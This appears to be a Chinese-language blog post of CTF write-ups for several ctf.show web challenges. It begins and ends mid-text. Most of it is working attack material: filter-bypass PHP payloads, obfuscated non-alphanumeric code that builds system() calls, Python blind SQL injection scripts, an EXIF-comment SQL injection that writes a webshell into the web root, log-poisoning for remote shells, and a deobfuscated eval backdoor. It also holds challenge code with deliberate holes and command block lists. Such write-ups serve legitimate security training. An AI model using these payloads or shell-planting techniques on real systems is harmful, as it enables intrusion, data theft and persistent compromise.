$_g_r; $i++) &#123; $_i = substr($_h_p, $i, 1); $_i = ord($_i); print_r($_i &amp; 0xC0); &#125; die;&#125;isset($_COOKIE[&#x27;secret&#x27;]) ? $json = $_COOKIE[&#x27;secret&#x27;] : setcookie(&#x27;secret&#x27;, &#x27;&#123;&quot;secret&quot;:&quot;&#x27; . strtoupper(md5(&#x27;y1ng&#x27;)) . &#x27;&quot;&#125;&#x27;, time()+7200 );checkCookie($json) ? $obj = @json_decode($json, true) : die(&#x27;no&#x27;);if ($obj &amp;&amp; isset($_GET[&#x27;give_me_shell&#x27;])) &#123; ($obj[&#x27;secret&#x27;] != $flag_md5 ) ? haveFun($flag) : echo &quot;here is your webshell: $shell_path&quot;;&#125;die; 先看下haveFun函数，输出$_i &amp; 0xC0，0xC0二进制形式11000000，由于数字的ascii码范围为48-57，大写字母的ascii码范围65-90，小写字母的范围97-122 因此与运算的结果只有两种: 1200000000 &#x3D;&#x3D;&gt; 001000000 &#x3D;&#x3D;&gt; 64 并且为数字的时候由于ascii小于64，因此计算结果为0，同理，为大小写字母时计算结果为64 由返回结果： 10006464640064064646464006406464064640064006400000000000 md5前三个字符均为数字，又： 12$obj[&#x27;secret&#x27;] != $flag_md5// 123==&#x27;123a&#x27; 比较是弱比较，因此我们可以用弱类型绕过，尝试爆破： 注意不能是： 1&#123;&quot;secret&quot;:&quot;115&quot;&#125; 访问得到源码： 123456789101112131415161718192021222324252627282930 &lt;?phperror_reporting(0);session_start();//there are some secret waf that you will never know, fuzz me if you canrequire &quot;hidden_filter.php&quot;;if (!$_SESSION[&#x27;login&#x27;]) die(&#x27;&lt;script&gt;location.href=\\&#x27;./index.php\\&#x27;&lt;/script&gt;&#x27;);if (!isset($_GET[&#x27;code&#x27;])) &#123; show_source(__FILE__); exit();&#125; else &#123; $code = $_GET[&#x27;code&#x27;]; if (!preg_match($secret_waf, $code)) &#123; //清空session 从头再来 eval(&quot;\\$_SESSION[&quot; . $code . &quot;]=false;&quot;); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker &#125; else die(&#x27;hacker&#x27;);&#125;/* * When you feel that you are lost, do not give up, fight and move on. * Being a hacker is not easy, it requires effort and sacrifice. * But remember … we are legion! * ————Deep CTF 2020*/ fuzz一下，发现下面的都不能用了 1&#96; ; include &#39; &quot; 可以用短标签，以下均可以正常允许 1234567&lt;?=phpinfo();&lt;?echo 123?&gt;&lt;?=`ls`?&gt; payload: 1?code&#x3D;1]&#x3D;1?&gt;&lt;?&#x3D;require~%D0%99%93%9E%98?&gt; WEB_RemoteImageDownloader_36DWEB_ALL_INFO_U_WANT_36D扫目录发现index.php.bak 12345678910111213141516171819202122phpvisit all_info_u_want.php and you will get all information you want= =Thinking that it may be difficult, i decided to show you the source code:&lt;?phperror_reporting(0);//give you all information you wantif (isset($_GET[&#x27;all_info_i_want&#x27;])) &#123; phpinfo();&#125;if (isset($_GET[&#x27;file&#x27;])) &#123; $file = &quot;/var/www/html/&quot; . $_GET[&#x27;file&#x27;]; //really baby include include($file);&#125;?&gt;really really really baby challenge right? 访问包含flag提示是假的，尝试getshell，预期解是包含/var/log/nginx/access.log，把一句话放在请求头里包含蚁剑连 1grep -r -l &quot;flag&quot; /etc 找到/etc/opt/secret/what_you_want 另外一种办法是包含自身，构造： 12345678910111213&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://591caabf-a243-4850-8254-3c4f913b12e2.chall.ctf.show/all_info_u_want.php?file=all_info_u_want.php&amp;all_info_i_want&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; WEB_WUSTCTF朴实无华Revenge_36D杯源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475 &lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);function isPalindrome($str)&#123; $len=strlen($str); $l=1; $k=intval($len/2)+1; for($j=0;$j&lt;$k;$j++) if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) &#123; $l=0; break; &#125; if ($l==1) return true; else return false;&#125;//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; $numPositve = intval($num); $numReverse = intval(strrev($num)); if (preg_match(&#x27;/[^0-9.-]/&#x27;, $num)) &#123; die(&quot;非洲欢迎你1&quot;); &#125; if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //在64位系统中 intval()的上限不是2147483647 省省吧 die(&quot;非洲欢迎你2&quot;); &#125; if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123; echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;金钱解决不了穷人的本质问题&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5(md5($md5))) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag); echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); &#125;else&#123; die(&quot;快到非洲了&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;?&gt;去非洲吧 先看第一关，大概意思就是两个条件： 12intval($num)&#x3D;&#x3D;&#x3D;intval(strrev($num))$num!&#x3D;strrev($num)并且$num只包含0-9.- 所以可以构造 123?num&#x3D;9.-9?num&#x3D;00.0?num&#x3D;10.010 再看第二关 双MD5与本身弱相等 直接用0e1138100474，最后一关命令执行，可以用\\和%09绕过，payload: 12?num&#x3D;10.010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\\t%09&#x2F;flag?num&#x3D;10.010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\\t&lt;&#x2F;flag WEB_Login_Only_For_36D_36D查看源码,发现： 12&lt;!-- if (!preg_match(&#39;&#x2F;admin&#x2F;&#39;, $uname)) die; --&gt;&lt;!-- select * from 36d_user where username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39;; --&gt; fuzz一下，发现过滤了 1select &#39; &quot; | 空格 ascii substr &#x3D; and mid 立马想到\\，发现下面可以延时： ascii函数可以用ord函数代替，等号用like，substr用left,payload: 1username&#x3D;admin\\&amp;password&#x3D;or&#x2F;**&#x2F;if((ord(left(password,1))&#x2F;**&#x2F;like&#x2F;**&#x2F;73),sleep(3),0)# 还可以用regexp注入，payload: 1username&#x3D;admin\\&amp;password&#x3D;or&#x2F;**&#x2F;if((left(password,1)&#x2F;**&#x2F;regexp&#x2F;**&#x2F;binary&#x2F;**&#x2F;0x49),sleep(3),1)# exp: 123456789101112131415161718192021222324import requestsurl=&quot;http://631b5cfe-7f15-4390-958c-228c6a9c421a.chall.ctf.show&quot;flag=&#x27;&#x27;hexflag=&#x27;&#x27;s=&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;for i in range(1,50): f1=flag for j in s: hexj=str(hex(ord(j))).replace(&#x27;0x&#x27;,&#x27;&#x27;) p1=&quot;or/**/if((left(password,&#123;&#125;)/**/regexp/**/binary/**/0x&#123;&#125;),sleep(3),1)#&quot;.format(str(i),hexflag+hexj) data1=&#123;&#x27;username&#x27;:&#x27;admin\\\\&#x27;,&#x27;password&#x27;:p1&#125; try: print(i,hexj) r1=requests.post(url,data=data1,timeout=3) except requests.exceptions.ReadTimeout as e: flag+=j hexflag+=str(hex(ord(j))).replace(&#x27;0x&#x27;,&#x27;&#x27;) print(flag) break except Exception as e: pass if flag==f1: break WEB你取吧36D杯源码： 123456789101112131415 &lt;?phperror_reporting(0);show_source(__FILE__);$hint=file_get_contents(&#x27;php://filter/read=convert.base64-encode/resource=hhh.php&#x27;);$code=$_REQUEST[&#x27;code&#x27;];$_=array(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;);$blacklist = array_merge($_);foreach ($blacklist as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/im&#x27;, $code)) &#123; die(&#x27;nonono&#x27;); &#125;&#125;eval(&quot;echo($code);&quot;);?&gt; 利用递增的那种思想构造就行 123&lt;?php$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$__=$_;$_++;$_++;$_++;$_++;$_______=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$________=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_________=$_;$_++;$__________=$_;$_____=$_;$_++;$_++;$_++;$_++;$_++;$___________=$_;$___.=$_________;$___.=$___________;$___.=$_________;$___.=$__________;$___.=$_______;$___.=$________;$____=&#x27;_&#x27;;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______=$__;$__++;$____.=$__;$____.=$______;$__++;$__++;$__++;$____.=$__;$__++;$____.=$__;$_=$$____;$___($_[_]);// SYSTEM($_POST[_]); payload: 1?code&#x3D;%31%29%3b%24%5f%3d%5b%5d%3b%24%5f%3d%40%22%24%5f%22%3b%24%5f%3d%24%5f%5b%27%21%27%3d%3d%27%40%27%5d%3b%24%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%3d%24%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b%2f%2f POST要执行的命令就行，注意code要url编码，因为由于php字符串解析特性会把+解析成空格，题目环境是php5.6如果是7.x还可以： 12(&#x27;``````&#x27;|&#x27;%13%19%13%14%05%0D&#x27;)(&#x27;``&#x27;|`%09%04`);// system(&#x27;id&#x27;); 构造system只需 12&lt;?phpecho urlencode(&#x27;system&#x27;^&#x27;``````&#x27;); 除此之外我们还可以利用$_变量来构造字符，脚本 123456789s=[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;]word=&#x27;system&#x27;code=&#x27;&#x27;for j in word: if j in s: code+=&#x27;$_[&#x27;+str(s.index(j))+&#x27;].&#x27; else: code+=&quot;&#x27;&quot;+j+&quot;&#x27;&quot;+&quot;.&quot;print(code) payload: 1?code&#x3D;1);$__&#x3D;$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___&#x3D;$_[2].$_[0].$_[19].&#39; &#39;.&#39;&#x2F;&#39;.$_[5].$_[13].$_[0].$_[6];$__($___);&#x2F;&#x2F; 本题预期解是先读hint 1?code&#x3D;$&#123;$_[7].$_[8].$_[12].$_[19]&#125; base64解码得到 123&lt;?php$a=&quot;/phpjiami.zip\\n/hint.php&quot;;?&gt; 然后把phpjiami.zip下载下来，打开发现1.php混淆加密的，并且提示是经过Www.PHPJiaMi.Com网站加密的，解密脚本，也可以用：https://github.com/PikuYoake/phpjiami_decode： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;?phpfunction decrypt($data, $key)&#123; $data_1 = &#x27;&#x27;; for ($i = 0; $i &lt; strlen($data); $i++) &#123; $ch = ord($data[$i]); if ($ch &lt; 245) &#123; if ($ch &gt; 136) &#123; $data_1 .= chr($ch / 2); &#125; else &#123; $data_1 .= $data[$i]; &#125; &#125; &#125; $data_1 = base64_decode($data_1); $key = md5($key); $j = $ctrmax = 32; $data_2 = &#x27;&#x27;; for ($i = 0; $i &lt; strlen($data_1); $i++) &#123; if ($j &lt;= 0) &#123; $j = $ctrmax; &#125; $j--; $data_2 .= $data_1[$i] ^ $key[$j]; &#125; return $data_2;&#125;function find_data($code)&#123; $code_end = strrpos($code, &#x27;?&gt;&#x27;); if (!$code_end) &#123; return &quot;&quot;; &#125; $data_start = $code_end + 2; $data = substr($code, $data_start, -46); return $data;&#125;function find_key($code)&#123; // $v1 = $v2(&#x27;bWQ1&#x27;); // $key1 = $v1(&#x27;??????&#x27;); $pos1 = strpos($code, &quot;(&#x27;&quot; . preg_quote(base64_encode(&#x27;md5&#x27;)) . &quot;&#x27;);&quot;); $pos2 = strrpos(substr($code, 0, $pos1), &#x27;$&#x27;); $pos3 = strrpos(substr($code, 0, $pos2), &#x27;$&#x27;); $var_name = substr($code, $pos3, $pos2 - $pos3 - 1); $pos4 = strpos($code, $var_name, $pos1); $pos5 = strpos($code, &quot;(&#x27;&quot;, $pos4); $pos6 = strpos($code, &quot;&#x27;)&quot;, $pos4); $key = substr($code, $pos5 + 2, $pos6 - $pos5 - 2); return $key;&#125;$input_file = $argv[1];$output_file = $argv[1] . &#x27;.decrypted.php&#x27;;$code = file_get_contents($input_file);$data = find_data($code);if (!$code) &#123; echo &#x27;未找到加密数据&#x27;, PHP_EOL; exit;&#125;$key = find_key($code);if (!$key) &#123; echo &#x27;未找到秘钥&#x27;, PHP_EOL; exit;&#125;$decrypted = decrypt($data, $key);$uncompressed = gzuncompress($decrypted);// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩if ($uncompressed) &#123; $decrypted = str_rot13($uncompressed);&#125; else &#123; $decrypted = str_rot13($decrypted);&#125;file_put_contents($output_file, $decrypted);echo &#x27;解密后文件已写入到 &#x27;, $output_file, PHP_EOL; 解密后得到： 12345&lt;?php$ch = explode(&quot;.&quot;,&quot;hello.ass.world.er.rt.e.saucerman&quot;);$c = $ch[1].$ch[5].$ch[4]; @$c($_POST[7-1]);?&gt; 蚁剑连 WEB_WUSTCTF朴实无华Revenge_Revenge_36D杯源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788 &lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);function isPalindrome($str)&#123; $len=strlen($str); $l=1; $k=intval($len/2)+1; for($j=0;$j&lt;$k;$j++) if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) &#123; $l=0; break; &#125; if ($l==1) return true; else return false;&#125;//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; $numPositve = intval($num); $numReverse = intval(strrev($num)); if (preg_match(&#x27;/[^0-9.]/&#x27;, $num)) &#123; die(&quot;非洲欢迎你1&quot;); &#125; else &#123; if ( (preg_match_all(&quot;/\\./&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\\-/&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\\-/&quot;, $num)==1 &amp;&amp; !preg_match(&#x27;/^[-]/&#x27;, $num))) &#123; die(&quot;没有这样的数&quot;); &#125; &#125; if ($num != $numPositve) &#123; die(&#x27;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#x27;); &#125; if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //在64位系统中 intval()的上限不是2147483647 省省吧 die(&quot;非洲欢迎你2&quot;); &#125; if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123; echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;金钱解决不了穷人的本质问题&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5(md5($md5))) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;nl&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag); if (preg_match(&quot;/[&#x27;\\*\\&quot;[?]/&quot;, $get_flag)) &#123; die(&#x27;非预期修复*2&#x27;); &#125; echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); &#125;else&#123; die(&quot;快到非洲了&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;?&gt;去非洲吧 可以看到： 123 &lt;?php var_dump(99999999999999999.99999999999999999==99999999999999999);// true 构造payload: 12?num&#x3D;0.?num&#x3D;99999999999999999.999999999999999990 接着一样，payload: 1?num&#x3D;99999999999999999.999999999999999990&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\\t%09&#96;ls&#96; payload: 1?num&#x3D;99999999999999999.999999999999999990&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\\t%09&#96;ls&#96; WEB你没见过的注入36D杯提示访问robots.txt 12User-agent: *Disallow: &#x2F;pwdreset.php 成功重置admin的密码，登陆之后发现是个上传，接着发现上传所有文件都变成.zip了，并且有文件属性相关信息 发现和file命令输出一样 接着就是EXIF头注入了，可以使用exiftool 1exiftool -overwrite_original -comment=&quot;test&quot; 1.jpg 再上传发现 试想有可能存到数据库里，猜后台sql: 1insert into column(name, type, lineFeed) values ($filename, $filetype, $filelinefeed); 尝试： 1exiftool -overwrite_original -comment=&quot;test\\&quot;&#x27;);select sleep(10);&quot; 1.jpg 发现成功延时了，直接写一句话 1exiftool -overwrite_original -comment&#x3D;&quot;test\\&quot;&#39;);select 0x3c3f706870206576616c28245f504f53545b315d293b into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;&quot; 1.jpg 发现部分内容没写上 估计有长度限制，用短标签缩短长度 1exiftool -overwrite_original -comment=&quot;test\\&quot;&#x27;);select 0x3c3f3d60245f504f53545b315d603b into outfile &#x27;/var/www/html/1.php&#x27;;&quot; 1.jpg hex部分是： 1&lt;?=`$_POST[1]`; web1签到内部赛查看源码发现register.php，存在sql注入，ban了： 1and | sleep 空格 &amp; if ascii exp: 123456789101112131415161718192021222324252627282930313233343536373839import requestsurl=&quot;http://8d1e1a44-371c-4be6-ae98-326ebebbff39.chall.ctf.show/register.php&quot;flag=&#x27;&#x27;for i in range(1,500): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 p1=&quot;1@1.com&#x27;/**/or/**/(case/**/when/**/ord(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;/**/then/**/benchmark(5000000,md5(0x41))/**/else/**/1/**/end)/**/or/**/&#x27;&quot;.format(i,mid) p2=&quot;1@1.com&#x27;/**/or/**/(case/**/when/**/ord(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))=&#123;&#125;/**/then/**/benchmark(5000000,md5(0x41))/**/else/**/1/**/end)/**/or/**/&#x27;&quot;.format(i,mid) data1=&#123;&#x27;e&#x27;:p1,&#x27;u&#x27;:&#x27;test&#x27;,&#x27;p&#x27;:&#x27;1234&#x27;&#125; data2=&#123;&#x27;e&#x27;:p2,&#x27;u&#x27;:&#x27;test&#x27;,&#x27;p&#x27;:&#x27;1234&#x27;&#125; try: print(i,mid) r1=requests.post(url,data=data2,timeout=3) except requests.exceptions.ReadTimeout as e: flag+=chr(mid) print(flag) break except Exception as e: pass else: try: r2=requests.post(url,data=data1,timeout=3) except requests.exceptions.ReadTimeout as e: low=mid+1 except Exception as e: pass else: top=mid-1 if flag==f1: break# web# 可以注出数据库，但是好像不能查information_schema 后来才知道还有源码泄露www.zip register.php： 123456789101112131415161718192021222324252627282930&lt;?phpfunction check($arr)&#123;if(preg_match(&quot;/load|and|\\||\\&amp;| |\\\\\\|sleep|ascii|if/i&quot;,$arr))&#123; echo &quot;&lt;script&gt;alert(&#x27;bad hacker!&#x27;)&lt;/script&gt;&quot;; die(); &#125;else&#123; return true;&#125;&#125;include(&#x27;db.php&#x27;);if(isset($_POST[&#x27;e&#x27;])&amp;&amp;isset($_POST[&#x27;u&#x27;])&amp;&amp;isset($_POST[&#x27;p&#x27;]))&#123;$e=$_POST[&#x27;e&#x27;];$u=$_POST[&#x27;u&#x27;];$p=$_POST[&#x27;p&#x27;];$sql =&quot;insert into test1set email = &#x27;$e&#x27;, username = &#x27;$u&#x27;,password = &#x27;$p&#x27;&quot;;if(check($e)&amp;&amp;check($u)&amp;&amp;check($p))&#123;if(mysqli_query($con, $sql))&#123;header(&#x27;location:login.php&#x27;);&#125;&#125;&#125; login.php： 1234567891011121314151617181920212223242526272829&lt;?phpfunction check($arr)&#123;if(preg_match(&quot;/load|and|or|\\||\\&amp;|select|union|\\&#x27;|=| |\\\\\\|,|sleep|ascii/i&quot;,$arr))&#123; echo &quot;&lt;script&gt;alert(&#x27;bad hacker!&#x27;)&lt;/script&gt;&quot;; die(); &#125;else&#123; return true;&#125;&#125;session_start();include(&#x27;db.php&#x27;);if(isset($_POST[&#x27;e&#x27;])&amp;&amp;isset($_POST[&#x27;p&#x27;]))&#123;$e=$_POST[&#x27;e&#x27;];$p=$_POST[&#x27;p&#x27;];$sql =&quot;select username from test1 where email=&#x27;$e&#x27; and password=&#x27;$p&#x27;&quot;;if(check($e)&amp;&amp;check($p))&#123;$result=mysqli_query($con,$sql);$row = mysqli_fetch_assoc($result); if($row)&#123; $_SESSION[&#x27;u&#x27;]=$row[&#x27;username&#x27;]; header(&#x27;location:user.php&#x27;); &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;Wrong username or password&#x27;)&lt;/script&gt;&quot;; &#125;&#125;&#125; user.php： 1234567891011121314151617181920212223&lt;?phpinclude(&#x27;db.php&#x27;);session_start();error_reporting(0);if($_SESSION[&#x27;u&#x27;])&#123;$username=$_SESSION[&#x27;u&#x27;];if (is_numeric($username)) &#123; if(strlen($username)&gt;10) &#123; $username=substr($username,0,10); &#125; echo &quot;Hello $username,there&#x27;s nothing here but dog food!&quot;; &#125; else&#123; echo &quot;&lt;script&gt;alert(&#x27;The username can only be a number.How did you get here?go out!!!&#x27;);location.href=&#x27;login.php&#x27;;&lt;/script&gt;&quot;;&#125;&#125;else&#123; echo &quot;&lt;script&gt;alert(&#x27;Login first!&#x27;);location.href=&#x27;login.php&#x27;;&lt;/script&gt;&quot;;&#125;?&gt; web03出题人不想跟你说话.jpg内部赛看到刀上有cai字样，盲猜是一句话密码，蚁剑连上，有两个hint: 123hint1: whoami &amp;&amp; ls -l &#x2F;hint2:如你们所说，提权，看看服务器有什么服务 ps -aux 12345678910111213141516USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.0 17960 636 ? Ss 12:27 0:00 /bin/sh 